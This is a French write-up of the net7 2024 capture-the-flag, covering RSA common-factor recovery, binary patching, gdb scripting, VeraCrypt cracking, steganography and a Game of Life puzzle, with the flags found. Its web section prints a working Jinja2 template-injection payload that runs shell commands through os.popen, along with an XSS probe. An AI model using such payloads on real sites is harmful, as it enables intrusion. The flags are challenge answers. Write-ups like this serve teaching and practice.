# Solutions ctf net7

# Index:
<div align="center">

| Category | Challenge | Tags |
| --- | --- | --- | 
| Crypto | [Encore et encore](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#encore-et-encore) | `RSA` `sage` |
| Reverse | [Sleepy](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#sleepy) | `ghidra` `binary patching` |
| Reverse | [Edit-me](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#edit-me) | `ghidra` `binary patching`  |
| Reverse | [Execution-Time](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#execution-time) | `ltrace` `system calls` |
| Reverse | [Java-dummy](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#java-dummy) | `java` |
| Reverse | [Incremental](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#incremental) | `ghidra` `dynamic analysis` `gdb` |
| Forensique | [Chall1](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#chall1) |  `john` `hashcat` `entropy` `VeraCrypt` |
| Forensique | [Chall2](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#chall2) | `steganography` |
| Forensique | [Chall3](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#chall3) | `docker` `grep` |
| Web | [Webchall](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#webchall) | `SSTI` |
| Stegano | [Sexion d'assaut](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#stegochall) | `OSINT` `LSB` `All my homies` |
| Algo | [Gaming on Linux](https://github.com/Maksence/write-ups/blob/main/net7/write-up2024.md#algochall) | `Game of life` |

</div>


## Crypto
### Encore et encore
Le programme tire une liste de 25 premiers. Parmi ces 25 premiers, il va tirer 5 fois deux paires p,q (p!=q) et chiffrer le même message par RSA.

La bonne idée a été de se dire que vu qu’il n’y a pas de condition d’unicité des paramètres de chaque paires (p,q) parmi les 5 Ni, il y avait potentiellement un p ou q en commun dans les 5 Ni. 
On cherche le pgcd de tous ces Ni 2 à 2.

```python
from Crypto.Util.number import bytes_to_long, getPrime, GCD
from random import randint


e = 65537
n1 = 15364987142567697852738627854464544105204167315743414335156847799321176953605439775057607494909597425674117285798585267918793242973388507221886602985246155412867507005723244260164619723289408243940961437043393612892265857778187644646988570679933414098732796104659541386677446275346867960432470940265157220584568583202896072257740329869853066150080244255694250118953262747143851694411739516250745429922057639843947855076132514298190313229714019548547060920067974547854984456189054647647380303629190633875015390368730924315174062531930535972480684661008346018188326842074918857128524386041305898432386128533279740668541
c1 = 10236272748888879131196273411284506742653469431201345563449736816010452940523583277310403210540387327393743539681608051046505533249170282779014787359740509803609904163476881632072466278359436868489811818911257748331850303526616410193811242898208517969291894581963123725167213228053573082240735050880383263990037766148546044556313289593354798671064488703764570441863053953223564603933914428776530917029254490808606988011772520843068059144329640497450959848486318458703583837279249122027673048982578572398388819247321235631078996842269697337733516781484264957534105723855249990297349076668338379668081204174387291540742
n2 = 9563284153299463440318816543991764986074526386228931675299711841640750329452369868225663399518263386461796034991344343785567035680172398208781058703661342952867115368469423636966730216554435210450684253814065631205921446594737357818066319979238447075453922852882696778953762687647973641001352277722592372282354693861727172909027326895828217599755861797190844604310823390105623197304418038718287543971606474536617348425945138721718502559038353285266042592163328209187341586916417909121209897926538599216922030754968403170673383649863888936159939184143992174165960988861947502305426429061951067413709645322031102254679
c2 = 3004121836447613258166965901507512148665204699829203530700865015043464537040503511890526774442906125662819341081733514647698622741822548316018930665218935825984322607421596647651818480356938492086077855118553371809218596672836285796391116034413613304644699097762176749360268409485715232074061347464855206612041538831432272311050374874819868804535262287146596733390271835601276160530135396739255533954014060347104143682578495682933951331327864818637938677480961573043082817810772125981588749699174906436507650195822630512665548434895747161479900956158113220302339379871907804805736884292929231621364254553975331262439
n3 = 14031554628448588078165535506063620814618738502223914594709757433995043399745517662441648417038662559524928355845987091802783587370102015081605426220174202445587945615195186175595895001946597856593506630938634268171984104614526608186172549843054162806779625952373287046019209533788618297721469381222353086314855920597194731168672783197620792379304233512110702880131861111214863191607678756978095656714931017586997862293144733343848856100010349386469326079230135269785049697846415997354465958795257753428962451084820470518608404724818405839439300970259037415838765080358386803714168708123363027250225643830315788835913
c3 = 5070073755000031690564526178746142205067498471952124116880538207444872105181372457414853126924744609111200583985591634556492551530122608303329868358381326197482261874820109796394141132227362891594113275063930416380099167479568166544824933910160133343036724836169516617656130343184105830329103121404997760778297771172464784014722945610607865245630678076231243691640028575890407354019541252622146171626251210302626441785266807343763450750754665642151462450423703773960328913775611388788133727615706093362167765164477641402262039525308723865795089188764416924912590226117682007654531140297859966136122743390500916948668
n4 = 17161305015306945903452858126711622113558595957928889356807345198924568618163850597772709868630340552845569489740090437395514067992096006570685518333972168232654151613415890288625640356225110328962570951838084438449157455638582762895794106875213249934115035727120905747322655293457120030714755142530531633507483654089323070773205153789129384367297123800484592039680611692415011689113563790385934249387391622957774669934616080071458724075727694642291191712666655154818953272077511999177173934291765967167780657828837593207183073658306596449508434160996634779786549016237893934014545403410957239472696095966798299662437
c4 = 4884718951167228664003980523515570644677484550902968758682996104282722567905461414460829650387019438563295102848301526588102507192375300695752369680785859112194397932728649654554913903139902190519455528326588910868596776807527558922592048730642087055365662867436585186522971965816529956291238830122179936892705915302095326654585817570227967301929688040532245156776994572126258339959680958353229182336362370930831645012385474946687844766400135589552352520157433969509206922529985119159233042508717670300634570234103241851001333092373109070388387835986844910574872280960650814052399106613579867967661991272722041639624
n5 = 28652727212830450093140570920108660531783359543500596476096943822588321384878222728005348888776096564372508423368406445860038755296528882014421568000083917646959918091202156716636892246964390700940465747510197759095355116651113775602489067072660263256418320756527692015980409532648118073027056429797513240688851485428195094745739300985185915390223569967148926589711371586079536394718441765546444025149848118487772037263345646480338407437235122850917322260738205806279354706451019917614995034810993907362370354732045920139799361365561409851138464217046117499286257212683631351826555541798125186783688906211851050769861
c5 = 5675180359343141171806223549177281154587354254634503896551189136558953496409648037151013738231981244193722235669599430519995816936752026463714369759255592537299040005948761981407585096536403040774649426317517503388875795548671104458935830934214062046331607425928192340187099226907622258471125337233057700910416744233522306559803169122166429489281402661742770816248036410276035474532008469742560117424689852460065443652095490187143313758143736020999676410575040691357215081679433112362177571785966732157563466188326476917745875980773481611277266681982131609325352423724282346413825663999598962314092671905619555736760


Ns = [n1, n2, n3, n4, n5]


q = 101223367756532253594652896151456548177198340096825180989986163657146887907192585406932512038774805174002426822039493849294225405127598053102199195444718659965393502175068761417276943655921092693240237620463771067452378635542913095674211629426071837198453222132065073366528625655661344072067071866470614359707


#Calculate the gcd
for i in range(-1,len(Ns)-1):
   for j in range(-1,len(Ns)-1):
       if i != j:
           print(f'GCD of {i+1} and {j+1} is {GCD(Ns[i],Ns[j])} \n')
```
output:
```shell    
GCD of 4 and 2 is 101223367756532253594652896151456548177198340096825180989986163657146887907192585406932512038774805174002426822039493849294225405127598053102199195444718659965393502175068761417276943655921092693240237620463771067452378635542913095674211629426071837198453222132065073366528625655661344072067071866470614359707
```
On utilise sagemath pour retrouver le chiffré et on décode le chiffré trouvé:
```python
m = 195053386703359583682344146664439854030202909627939521005279968547329438589
print(m.to_bytes((m.bit_length() + 7) // 8, 'big').decode())
```
net7{Les1er***********************}

## Reverse
### Sleepy
Le programme donné calcule le flag mais il le fait en exécutant une instruction usleep supplémentaire dont la longueur augmente de manière exponentielle. 
J’ai patché le binaire sur Ghidra (https://vickieli.dev/binary%20exploitation/intro-to-binary-patching/)  pour réduire la longueur du usleep (ici set à 0x111)

![usleep patched -> value from 0x100000 to 0x111](https://github.com/Maksence/write-ups/blob/main/net7/images/usleep.png)

```shell
$ ./patch.bin 
Hello! I know you are here to get the flag, but you can't get it that easily!
I think that I am too slow to decypher it in the correct way
This is the flag that I computed for you: Y0u_!fl4gg3d
```

### Edit me
Une fonction “forgotten” est présente dans le programme mais jamais appelée. Comme précédemment on va patcher le binaire pour dérouter l'exécution d’un JMP vers la fonction forgotten
![forgotten](https://github.com/Maksence/write-ups/blob/main/net7/images/forgotten.png)
```shell
$ ./out.bin 
Hey there! How are you doing?
This is the flag you are looking for: 81N4rY-W45-M0D1F13D
Erreur de segmentation (core dumped)
```

### Execution time
Sans même chercher à comprendre ce que fait le programme avec Ghidra, on lance ltrace (https://man7.org/linux/man-pages/man1/ltrace.1.html) pour tracer les appels système et librairies dynamiques utilisées par le programme et on voit tout de suite que le programme fait un strcmp avec quelque chose qui ressemble beaucoup au flag
```shell
$ ltrace ./execution_time.bin 
printf("Enter the flag: ")                       = 16
fgets(Enter the flag: aa
"aa\n", 32, 0x7f72482958e0)                = 0x7fffcc09e7f0
strlen("#\310#\2400(\023\vxs(\023p#s\0233s8#\030\320s#\310\240\023(\023x\300\n"...) = 32
strlen("3X3CUT10N-T1M3-15-V3RY-3XC1T1NG\020"...) = 32
strcmp("aa\n", "3X3CUT10N-T1M3-15-V3RY-3XC1T1NG") = 46
puts("Try again!"Try again!
)                               = 11
+++ exited (status 0) +++
```

### Java Dummy

On nous donne une classe en java. La plus grosse difficulté de ce challenge est d’avoir le courage de toucher à du java. 
On prend son courage à deux mains, on lance son IDE java préféré, on ouvre la classe et on analyse.
Pour accéder au compte admin, le programme attend que l’on lui donne le user “admin” et un mdp qui est un entier comparé à une valeur calculée à partir de la graine "kH9mPjH7d5d3"

Il suffit de faire le chemin inverse et d'imprimer la valeur de l'entier attendue dans le main
```java
   public static void main(String[] var0) {
       System.out.println("Please login");
       Boolean var1 = false;
 
       while(true) {
          while(!var1) {
             System.out.println("Enter your username:");
             String var2 = System.console().readLine();
             Integer var3 = generatePassword(var2);
             if (var3 == -1) {
                System.out.println("This user does not exist!");
             } else {
                System.out.println("Enter your password:");
                String var4 = System.console().readLine();
 
                try {
                   Integer.parseInt(var4);
                } catch (NumberFormatException var6) {
                   System.out.println("Should be a number!");
                   continue;
                }
                Integer var5 = Integer.parseInt(var4);
                 //On ajoute juste la ligne suivante pour print la valeur de l'entier
                System.out.println("flag is:"+String.valueOf(var3));
                if (var5.equals(var3)) {
                   var1 = true;
                   System.out.println("Welcome " + var2 + "!");
                } else {
                   System.out.println("Invalid username or password!");
                }
             }
          }
 
          return;
       }
    }
```
output:
```shell
Please login
Enter your username:
admin
Enter your password:
0
flag is:962
Invalid username or password!
```

### Incremental
Le plus dur de cette série de challenges:
Le programme prend en entrée un paramètre qui semble être le flag et boucle sur chaque caractère en le comparant à la valeur de retour d’une fonction qui fait des opérations arithmétiques sur l’input. 

![calculate_value](https://github.com/Maksence/write-ups/blob/main/net7/images/calculate_value.png)

La fonction calculate_value semble reproductible localement et permet de trouver l’output attendu pour le premier caractère facilement. 
Seul problème: a quoi comparer cet output ? It’s gdb time.
https://ctf101.org/reverse-engineering/what-is-gdb/
On va chercher à regarder le contenu des registres au moment de la comparaison d’un caractère

![compare](https://github.com/Maksence/write-ups/blob/main/net7/images/compare.png)

Pour ça:
```shell
gdb incremental_time.bin
disas main
```
on trouve l’adresse en mémoire de cette comparaison
```shell
0x00005555555553f9 <+545>:    cmp	%al,%dl
```

On met un breakpoint
```sh
b *0x55555553f9
```
et on demande un display des registres en question à chaque arrêt 
```sh
display $al
display $dl
```
On lance le programme:
```shell=   
run
[...]
Using host libthread_db library "/lib64/libthread_db.so.1".
Enter the flag: A

Breakpoint 1, 0x00005555555553f9 in main ()
1: $al = 6
2: $dl = 115
```
Bon, maintenant on peut voir dynamiquement si notre caractère est bon (si les deux registres sont égaux). Par contre on ne peut pas prédire facilement le caractère à mettre puisqu’il dépend de la valeur précédente.
Technique incrémentale: on cherche un caractère, on trouve le bon, puis on relance avec un caractère supplémentaire.

Maintenant ce serait vachement bien de pouvoir reverse le caractère à partir de la valeur du registre $al, ie trouver le bon caractère à partir de la valeur trouvée. Voici mon programme python qui essaie de reproduire le comportement des fonctions du binaire.

```python-repl=
import string
local_ec = 0x36


def calculate_value(input, ec):
   local_10 = ord(input)
   for local_c in range(ec):
       local_10 = (local_10 - 0x18) & 0xff
   return local_10 ^ 0x42


out = calculate_value("A", local_ec)
flag= [6,124]
counter = len(flag) - 1
test = flag[-1]
for i in string.printable:
   if calculate_value(chr(flag[counter - 1] ^ ord(i)), local_ec) == test:
       print("char",i)
```
Ce programme marche très bien pour les premiers caractères mais ensuite on a des valeurs négatives et là ça pète (un char négatif python il aime pas). Après avoir passé un bon moment à débugger sans succès, ayant déjà les deux premiers mots du flag, je me dis qu’il est surement pas si long et qu’armé de mon bon sens je vais le trouver a la mano.

Grossière erreur, en fait il était vachement long le flag. But Mama didn’t raise no quitter donc on va au bout et on trouve
```python
flag= [6,124,127,120,85,68,-66,56,-67,56,-71,-91,-112,-47,60,25,95,-66,-109,-113,-19,-21,-26,-121,-31,-122,-115,128,-22,-19,-21,-26,-19,-113,-134,-123,-6,X,X,X,X,X,X]
#      T  H   1   5  _  C   H   4  7   7   3   N   G   3  _   W  4  S    _    N   0   T   _    3   4    S    Y   _   8   U   T   _    Y   0    U    _   M 4 D 3 _ 1 T
# TH15_CH4773NG3_W4S_N0T_345Y_8UT_Y0U_M4D3_1T
```
NB: Pour ce genre de challenge, scripter du gdb m'aurait fait gagner beaucoup de temps, mais la documentation en ligne est rare. C'était d'ailleurs la solution attendue par l'auteur, merci à lui @DreadFog https://github.com/DreadFog
```python
#!/usr/bin/env python3
# run this script through gdb by typing `source solver.py`
p = ['a']*43
chars = [i for i in range(0x21, 0x7f)] # assume the password is composed of printable chars
list_idx = 0
currchar = 0 # idx of the current evaluated char
nb_continue= 0
gdb.execute("set confirm off")
gdb.execute("set pagination off")
gdb.execute("file ./incremental.bin")
gdb.execute("b *0x00005555555553fb")
for i in range(10000):
    # set stdin to pass
    with open("pass", "w") as f:
        f.write("".join(p))
    gdb.execute("r < pass")
    for i in range(nb_continue):
        gdb.execute("c")
    c = gdb.parse_and_eval("$eflags")
    if "ZF" not in str(c):
        # the current letter is incorrect
        p[currchar] = chr(chars[list_idx])
        list_idx = (list_idx + 1) % len(chars)
    else:
        print("".join(p))
        currchar += 1
        list_idx = 0
        nb_continue = nb_continue + 1
    gdb.execute("k")
```

## Forensique
### Chall1
On nous donne un fichier de type data.
On peut chercher dans tous les sens: strings, binwalk, steghide, foremost, exiftool on ne trouvera rien et pour cause: une analyse d’entropy sur Cyberchef montre que ce fichier est chiffré. 

Après avoir cherché sur internet je trouve des méthodes de déchiffrement de Truecrypt et je me lance. J’avais lancé mon hashcat quand je me suis rendu compte que l’indice du chall pour notre équipe avait été débloqué. 

J’ignore si j’ai cliqué dessus par accident ou si c’est un collègue, en tout cas la manoeuvre n’était pas volontaire mais elle révèle que le chfifrement est en fait du VeraCrypt. J’y serais surement arrivé au bout d’un moment mais une fois l’indice débloqué on gagne beaucoup de temps.

NB: on lancant hashcat sans paramètres j'aurai directement eu le bon type de chiffrement (merci @neptune)

La suite j’ai juste suivi le wu suivant qui est très bien fait:
https://medium.com/@malik.ubaidullah16/digital-cyber-security-hackathon-2023-forensics-container-writeup-f0c566155b8d
net7{donthaveitanymoreand2lazytofindagain}
### Chall2
On a un fichier topsecretimage.png qui pèse particulièrement lourd (3,4MB).
Petit coup de steganography online https://stylesuxx.github.io/steganography/ 
net7{YXGR3a5PypSE7HW6sMcfN2}

### Chall3

On nous donne une image docker. Sans même chercher à comprendre ce qu’elle fait
```shell
$ grep -r "net7{"
grep: a5e1b6fa333c54f2c49388e89175fbaac898b9df00d127d2b9750ae080b4cfb5/layer.tar : fichiers binaires correspondent
a5e1b6fa333c54f2c49388e89175fbaac898b9df00d127d2b9750ae080b4cfb5/root/flag.txt:net7{ZBQK8b4OqrTD1VU9lIxJ2}
```
net7{ZBQK8b4OqrTD1VU9lIxJ2}

## Web
Un site internet avec une unique page
Après avoir passé bcp trop de temps à m’autoconvaincre que la vuln à exploiter était une XSS (<image%20src%20=q%20onerror="document.write(document.location)">)
On a en fait une SSTI ( {{7*7}} renvoie 49 )
Payload utilisé et url-encodé

```shell
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
%7b%25%20%66%6f%72%20%78%20%69%6e%20%28%29%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d%7b%25%20%69%66%20%22%77%61%72%6e%69%6e%67%22%20%69%6e%20%78%2e%5f%5f%6e%61%6d%65%5f%5f%20%25%7d%7b%7b%78%28%29%2e%5f%6d%6f%64%75%6c%65%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%5b%27%5f%5f%69%6d%70%6f%72%74%5f%5f%27%5d%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%22%63%61%74%20%66%6c%61%67%2e%74%78%74%22%29%2e%72%65%61%64%28%29%7d%7d%7b%25%65%6e%64%69%66%25%7d%7b%25%20%65%6e%64%66%6f%72%20%25%7d
```
## Stegano
All my homies hate steganography. 
Un chall en 3 parties. La première qui ressemble plus à de l'OSINT est rapidement résolue, mais la deuxième...
J'ai pas flag, y'avait un LSB sur le canal bleu que j'ai pas vu. Dédicace à la team fl0ck qui a solve la step 2 à une heure de la fin du ctf, mais pas la step 3 :)

## Algo
### Gaming on linux:
Un game of life où il faut comparer le board initial avec le board à chaque step pour trouver la période du motif. Très intéressant dans la mesure où je m'étais jamais penché sur les game of life.

J’avais commencé à écrire mon propre game of life mais par souci de temps j’ai finalement récupéré https://github.com/reppertj/Game-of-Life?tab=readme-ov-file que j’ai adapté pour faire la comparaison, i.e. on fait une deepcopy de l'état initial du board et on compare à chaque étape pour savoir si on est retourné à l'état initial.

```shell    
$ python life.py -f pattern.rle
The final step is 856
```

NB: le flag étant juste la période (et donc un entier probablement entre 0 et 1000), il se bruteforcait très facilement sur le site du ctf (j’avais testé pour les 20 premiers entiers :’) ) 

## Conclusion:
Merci aux orgas de net7, la partie reverse était particulièrement instructive.
